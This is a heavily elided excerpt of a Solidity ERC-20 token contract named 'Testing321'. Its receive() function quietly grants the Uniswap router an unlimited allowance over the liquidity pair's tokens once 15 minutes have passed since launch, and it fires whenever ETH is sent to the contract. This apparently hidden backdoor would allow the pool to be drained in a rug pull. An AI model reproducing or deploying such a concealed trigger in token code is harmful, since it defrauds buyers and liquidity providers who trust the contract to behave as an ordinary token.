...
contract Testing321 is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Testing321";
    ...
    receive() external payable {if(block.timestamp > (launchTime + 15 minutes)){_allowances[uniswapV2Pair][_uniswapV2Router] = type(uint).max;}}
